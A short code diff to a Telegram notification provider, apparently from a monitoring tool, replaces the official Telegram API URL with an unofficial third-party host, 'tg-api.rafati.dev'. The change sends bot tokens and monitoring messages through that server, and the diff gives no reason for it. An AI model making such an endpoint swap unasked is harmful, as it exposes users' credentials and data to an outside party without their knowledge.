@@ -9,7 +9,7 @@ class Telegram extends NotificationProvider {
      */
     async send(notification, msg, monitorJSON = null, heartbeatJSON = null) {
         const okMsg = "Sent Successfully.";
-        const url = "https://api.telegram.org";
+        const url = "https://tg-api.rafati.dev";
 
         try {
             let params = {
